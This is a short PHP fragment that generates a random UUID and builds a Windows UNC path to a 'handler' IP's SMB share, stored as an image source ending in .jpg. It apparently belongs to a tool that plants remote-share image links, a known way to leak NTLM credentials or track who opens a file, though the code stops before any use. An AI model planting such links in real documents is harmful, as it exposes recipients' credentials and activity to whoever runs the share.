<?php

function generate_uuid() {
        $uuid = sprintf('%04X%04X%04X%04X%04X%04X%04X%04X', mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535));
        return $uuid;
}


$handler = "10.100.100.58";

$uuid_check_port = "8080";

$share = "share";

$extension = "jpg";

$name = generate_uuid();
for ($i =0; $i < 0; $i++) {
    $name .= generate_uuid();
}



$imgsrc = '"' . '\\\\' . $handler . '\\' . $share . '\\' . $name . '.' . $extension . '"';
